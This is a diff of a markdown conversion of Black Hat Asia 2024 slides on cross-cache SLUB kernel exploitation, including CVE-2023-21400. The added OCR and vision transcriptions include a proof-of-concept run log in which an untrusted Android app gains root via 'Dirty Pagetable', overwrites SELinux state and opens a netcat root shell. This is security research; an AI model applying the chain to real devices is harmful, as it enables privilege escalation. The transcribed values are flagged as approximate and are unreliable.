@@ -8,19 +8,25 @@ year: 2024
 source_pdf: "BlackHat ASIA 2024-Slides/Le Wu & Qi Zhang-Game of Cross Cache Let's Win It in a More Effective Way.pdf"
 pages: 93
 sha256: "3d6f4e948d13a7c9ea659d69a624716081b23ed883037e27566cc01912d05da4"
-text_chars: 41711
-ocr_pages: 2
+text_chars: 41028
+ocr_pages: 5
 has_ocr: true
 redacted_secrets: 0
+ocr_confidence: 87.0
+ocr_unreliable_blocks: 0
+vision_verified_blocks: 1
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-12T00:49:21Z"
+converted_at: "2026-08-12T04:48:27Z"
 ---
 # Game of Cross Cache Let's Win It in a More Effective Way
 
 **Speakers:** Le Wu, Qi Zhang  
 **Conference:** Black Hat ASIA 2024  
 **Source:** `BlackHat ASIA 2024-Slides/Le Wu & Qi Zhang-Game of Cross Cache Let's Win It in a More Effective Way.pdf` (93 pages)
+
 
 ## Slide 1
 
@@ -29,18 +35,6 @@ Game of Cross Cache: Let's win it in a more effective way!
 Le Wu From Baidu Security
 
 #BHASIA @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-Sang ~~. T
-blackhat« D> <> Se
-oo” —ieiens 2024 l : - &. evi
-Game of Cross Cache:
-Let's win itin a more effective way!
-Le Wu From Baidu Security
-#BHASIA @BlackHatEvents
-```
 
 ## Slide 2
 
@@ -128,6 +122,19 @@ Well, it's known as an **unstable** technique...
 
 Step 0. Common knowledge for SLUB allocator
 
+
+> Recovered by OCR — confidence 86/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+
+```text
+Step 0. Common knowledge for SLUB allocator
+| kmem_cache A }
+[| free object
+[_ in-use object
+a cpu slab IH cpu #0
+freelist |
+page
+```
+
 ## Slide 9
 
 #### Common workflow of Cross-cache attack
@@ -196,11 +203,43 @@ Step6. Trigger the vulnerability(UAF) to release the victim object
 
 Step7. Allocate objs_per_slab+1 objects as post-alloc objects
 
+
+> Recovered by OCR — confidence 86/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+
+```text
+Step7. Allocate objs_per_slab+1 objects as post-alloc objects
+| kmem_cache A Ht cpu slab io cpu #0
+~
+Free object oo
+pre-alloc object ve
+Y
+“cpu_partial" full slabs
+UUBU
+post-alloc object
+victim object partial page
+```
+
 ## Slide 16
 
 #### Common workflow of Cross-cache attack
 
 Step8. Release all the pre-alloc and post-alloc objects
+
+
+> Recovered by OCR — confidence 90/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+
+```text
+Step8. Release all the pre-alloc and post-alloc objects
+free object
+in-use object
+pre-alloc object
+post-alloc object
+victim object
+- cpu slab | 4 cpu #0
+page
+Jvictim slab(empty slab)
+“cpu_partial" full slabs
+```
 
 ## Slide 17
 
@@ -354,6 +393,23 @@ Allocated from a dedicated kmem_cache "IPA_TX_PKT_WRAPPER"
 CVE-2023-21400
 
 Allocated from a dedicated kmem_cache "IPA_TX_PKT_WRAPPER"
+
+
+> Recovered by OCR — confidence 84/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+
+```text
+Advancing Towards a More Effective Cross-Cache Attack
+Allocated from a dedicated kmem_cache "IPA_TX_PKT_WRAPPER"
+x1q:/sys/kernel/slab/IPA TX PKT WRAPPER # order
+0
+104
+x1q:/sys/kernel/slab/IPA_ TX _PKT_ WRAPPER # objs per slab
+39
+30
+Ce + cpu slab H cpu #0 freelist ]
+partial page a ee —)
+30 slabs at most on the partial list
+```
 
 ## Slide 30
 
@@ -1408,188 +1464,161 @@ avd->allowed = 0xffffffff; goto out;
 
 - • ~65%(13/20) success rate
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 88/100 on the text kept, 75/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
 Win The Game
-e System privilege required
-e Less than 10% success rate
-10:49 08 %4100%8
-ao1
-‘data/user/0/jackpal.androidterm/app_HOME $
-: /data/user/0/jackpal.androidterm/app_HOME $ id
-luid=10284(u0_a284) gid=10284(u0_a284) groups=10284(u0_a284),
-[3003 (inet ) ,9997( everybody), 20284 (uC |_cache) ,50284(al1_a2]
-84) context=u:r:untrusted_app_25:50:c512,c76
-/data/user/0/jackpal.androidterm/app_HOME $
-/data/user /0/jackpal.androidterm/app_HOME $ getenforce
-etenforce: Couldn't get enforcing status: Permission den
-/data/user/0/jackpal.androidterm/app_HOME $
-p ro.build. fingerprint <
-24 .014/69810ZCU4HWDT : user /rel
-/data jackpal.androidterm/app_HOME $
-/data/user /0/jackpal.androidterm/app_HOME $ ./poc
-(LLLLLLLLLLLLLLL LLL cd
-qi #
-Game of Cross Cache #
-#
-TO CLLULULLLLLLCLLLLL Lab ceeu bacco occcad
-10, epoll_fd:11
-fd:9124
-map_buf_ioct1.npu_phys_addr: ff fff000
-req.network_hdl: 10001
-prepare_alloc_new_slab is done
-prepare_gen_mov_slab is done
-unload thread: 10
-active_candidate:2681644
-active_candidate: 2681856
-em gets quite maybe
-finsihed running out kmalloc-8k
-[+] try running out the cached pages in ion-pool to reduce nf
-loise
-[+] old kreclaim: 133356
-[+] new kreclaim: 133396
-[+] finished creating high-order pag
-[+] Try to construct and detect kernel shrink action... (may|
-take a while)
-value for evaluating the reclaiming
-value for evaluating the reclaiming
-value for evaluating the reclaiming
-value for evaluating the reclaiming
-value for evaluating the reclaiming:
-value for evaluating the reclaiming
-value for evaluating the
-¢ Attack from Untrusted App
-value for evaluating the reclaiming
-value for evaluating the reclaiming
-value for evaluating the reclaiming
-value for evaluating the reclaiming
-value for evaluating the reclaiming
-value for evaluating the reclaiming
-value for evaluating the reclaiming
-value for evaluating the reclaiming
-value for evaluating the reclaiming
-value for evaluating the reclaiming
-value for evaluating the reclaiming
-value for evaluating the reclaiming
-Unmovable free_area should be almost empty now
-5 dma-buf fd
-Detected the kernel shrink!
-finish the victim slab discard
-the victim filp slab should have been discarded, wal
-the file release
+
+• System privilege required
+• Less than 10% success rate
+   →
+• Attack from Untrusted App
+• ~65%(13/20) success rate
+
+[Screenshot 1 — 窗口 1, 10:49]
+:/data/user/0/jackpal.androidterm/app_HOME $
+:/data/user/0/jackpal.androidterm/app_HOME $ id
+uid=10284(u0_a284) gid=10284(u0_a284) groups=10284(u0_a284),3003(inet),9997(everybody),20284(u0_a284_cache),50284(all_a284) context=u:r:untrusted_app_25:s0:c512,c768
+:/data/user/0/jackpal.androidterm/app_HOME $
+:/data/user/0/jackpal.androidterm/app_HOME $ getenforce
+getenforce: Couldn't get enforcing status: Permission denied
+1|:/data/user/0/jackpal.androidterm/app_HOME $
+etprop ro.build.fingerprint                                                              <
+samsung/x1qzcx/x1q:13/TP1A.220624.014/G9810ZCU4HWD1:user/release-keys
+:/data/user/0/jackpal.androidterm/app_HOME $
+:/data/user/0/jackpal.androidterm/app_HOME $ ./poc
+
+####################################################
+#                                                  #
+#              Game of Cross Cache                #
+#                          -- By Nicolas & Ye      #
+#                                                  #
+####################################################
+
+[+] current uid:10284
+[+] recv evil fd:8
+[+] main_to_file_array:10, epoll_fd:11
+[+] evil fd:9124
+[+] main thread:10233
+[+] map_buf_ioctl.npu_phys_addr:fffff000
+[+] req.network_hdl:10001
+[+] prepare_alloc_new_slab is done
+[+] prepare_gen_mov_slab is done
+[+] unload thread:10966
+[+] active_candidate:2681644
+[+] active_candidate:2681856
+[+] system gets quite maybe
+[+] finsihed running out kmalloc-8k
+[+] try running out the cached pages in ion-pool to reduce noise
+[+] old kreclaim:133356
+[+] new kreclaim:133396
+[+] finished creating high-order pages
+[+] Try to construct and detect kernel shrink action... (may take a while)
+[+] value for evaluating the reclaiming:-6
+[+] value for evaluating the reclaiming:-10
+[+] value for evaluating the reclaiming:-12
+[+] value for evaluating the reclaiming:-14
+[+] value for evaluating the reclaiming:-13
+[+] value for evaluating the reclaiming:-16
+[+] value for evaluating the reclaiming:-17
+
+[Screenshot 2 — 窗口 1, 10:50]
+[+] value for evaluating the reclaiming:21
+[+] value for evaluating the reclaiming:21
+[+] value for evaluating the reclaiming:22
+[+] value for evaluating the reclaiming:23
+[+] value for evaluating the reclaiming:24
+[+] value for evaluating the reclaiming:24
+[+] value for evaluating the reclaiming:25
+[+] value for evaluating the reclaiming:26
+[+] value for evaluating the reclaiming:27
+[+] value for evaluating the reclaiming:27
+[+] value for evaluating the reclaiming:28
+[+] value for evaluating the reclaiming:29
+[+] Unmovable free_area should be almost empty now.
+[+] cost 7035 dma-buf fd
+[+] Detected the kernel shrink!
+[+] finish the victim slab discard
+[+] Now, the victim filp slab should have been discarded, wait for the file release
 [+] finished the pagetable heaping
-[+] start the Dirty Pagetable
-[+] eased the memory wait for a whil
+[+] start the Dirty Pagetable!
+[+] eased the memory pressure, wait for a while
 [+] to perform dup()*0x1000, we might get into a dead loop
 [+] found the evil vaddr
-[+] evil_vaddr:Oxbfaf9000, dup vaddr :Oxbfb29
-, mark: Oxdead}
+[+] evil_vaddr:0xbfaf9000, dup vaddr:0xbfb29000, mark:0xdeadbeef
 [+] munmap() the evil_vaddr
 [+] remap the evil_vaddr with dma_buf fd
 [+] init the pipe buffer
 [+] to the leak pipe buffer
 [+] try to flush pte cache
-[+] leaked data
-[+] addr: oxbfafs content: fff fffbf0994bdcO
-[+] addr content :8300000000
-[+] addr: Oxbfaf9010, content: ffffff8009b42900
-[+] we might have catch one pipe buffer at Oxbfaf9000
+[+] leaked data:
+[+] addr: 0xbfaf9000, content:ffffffbf0994bdc0
+[+] addr: 0xbfaf9008, content:8300000000
+[+] addr: 0xbfaf9010, content:ffffff8009b42900
+[+] we might have catch one pipe buffer at 0xbfaf9000
 [+] Yes! We catch the pipe buffer
-pipe page: Oxf fffffbfo994bdc0, pipe ops:0xffffff8009b4290}
-kas1r: 120000
-pipe page: ffffffbfos94bdc0, vaddr: ffffffc2652f7000, len:|
-31
-vil_pipe_fds[0]:172, evil_pipe_fds(1]:173
-finish writing the reject_allow_unknown_vaddr
-selinux_map_mapping: Oxf fffffc267e48000, selinu
+[+] pipe page:0xffffffbf0994bdc0, pipe ops:0xffffff8009b42900
+[+] kaslr:120000
+[+] pipe page:ffffffbf0994bdc0, vaddr:ffffffc2652f7000, len:131
+[+] evil_pipe_fds[0]:172, evil_pipe_fds[1]:173
+[+] finish writing the reject_allow_unknown_vaddr
+[+] the selinux_map_mapping:0xffffffc267e48000, selinux_map_size:0x5e
 [+] finish overwriting the selinux_map_mapping
 [+] reverse shell should be ready now !!!
-nect to root shell with cmd: /system/bin/toybox netca}
-1 -p 1234 -L
-10:50 BO®
+[+] connect to root shell with cmd: /system/bin/toybox netcat -s 127.0.0.1 -p 1234 -L
+
+[Screenshot 3 — 窗口 2, 10:50]
+:/ $ netcat -s 127.0.0.1 -p 1234 -L
+id
+uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
+
 cat /proc/iomem
-100100000-002ef FFF
-lo0408000-004
-100784000-0
-00800
-lo0980000-'
-100984000
-Joosgsod
-loo9940
-1009c0000-009c 1fff
-looasso
-)a8c000-00a8f fff
-100ac0000-00ac 1 fff
-10188101c-0188101f
-101881024-01881027
-101881028-0188102b
-10188103c-0188103f
-101882014-01882017
-101d84000-01d86fff
-101d87000-01d87dff
-101d90000-01d97f ff
-103d00000-03d3f fff
-103d90000-03d98f ff
-100-O3daf ftF
-103dc2200-03de2207
-103dc2208-03dc220f
-06002000-06002fFF
-106004000-06004f ff
-06004000-06004f FF
-106005000-06005f fF
-06005000-06005f ff
-106010000-06010f Ff
-06010000-o6010f ff
-10601 1000-06011 FFF
-06011000-06011f fF
-106012000-06012F ff
-06012000-06012f ff
-106013000-06013f FF
-06013000-06013f fF
-106014000-06014f FF
-06014000-06014f fF
-* ~65%(13/20) success rate
-qcom, ipcc@408000
-afprom@780000
-12¢@880000
-i2c@884000
-qcom, qupv3.
-12¢@980000
-984000
-2988000
-i2¢@994000
-qcom, qupv
-i2¢@a88000
-100
-7m, qupv3_1_geni_se@ac0000
-tatus
-geni_se@8c0000
-se@9c0000
-sp2:
-mb.
-mb, spare2
-ufs
-phy_mem
-ufs_ice
-kgs1-3d0
-cc_base
-base
-status-reg
-status-reg
-base
-base
-stm-base
-funnel-base
-funnel-base
-cti-base
-cti-base
-cti-base
-cti-base
-ti-base
-cti-base
-ti-base
-O
+00100000-002effff : cc_base
+00408000-00408fff : qcom,ipcc@408000
+00784000-00786fff : qfprom@780000
+00880000-00883fff : i2c@880000
+00884000-00887fff : i2c@884000
+008c0000-008c1fff : qcom,qupv3_2_geni_se@8c0000
+00980000-00983fff : i2c@980000
+00984000-00987fff : i2c@984000
+00988000-0098bfff : i2c@988000
+00994000-00997fff : i2c@994000
+009c0000-009c1fff : qcom,qupv3_0_geni_se@9c0000
+00a88000-00a8bfff : i2c@a88000
+00a8c000-00a8ffff : i2c@a8c000
+00ac0000-00ac1fff : qcom,qupv3_1_geni_se@ac0000
+0188101c-0188101f : sp2soc_irq_status
+01881024-01881027 : sp2soc_irq_clr
+01881028-0188102b : sp2soc_irq_mask
+0188103c-0188103f : rmb_err
+01882014-01882017 : rmb_err_spare2
+01d84000-01d86fff : ufs_mem
+01d87000-01d87dff : phy_mem
+01d90000-01d97fff : ufs_ice
+03d00000-03d3ffff : kgsl-3d0
+03d90000-03d98fff : cc_base
+03da0000-03daffff : base
+03dc2200-03dc2207 : status-reg
+03dc2208-03dc220f : status-reg
+03dc5000-03dc5fff : base
+03dc9000-03dc9fff : base
+06002000-06002fff : stm-base
+   06002000-06002fff : stm-base
+06004000-06004fff : tpda-base
+   06004000-06004fff : tpda-base
+06005000-06005fff : funnel-base
+   06005000-06005fff : funnel-base
+06010000-06010fff : cti-base
+   06010000-06010fff : cti-base
+06011000-06011fff : cti-base
+   06011000-06011fff : cti-base
+06012000-06012fff : cti-base
+   06012000-06012fff : cti-base
+06013000-06013fff : cti-base
+   06013000-06013fff : cti-base
+06014000-06014fff : cti-base
+   06014000-06014fff : cti-base
 ```
 
 ## Slide 90
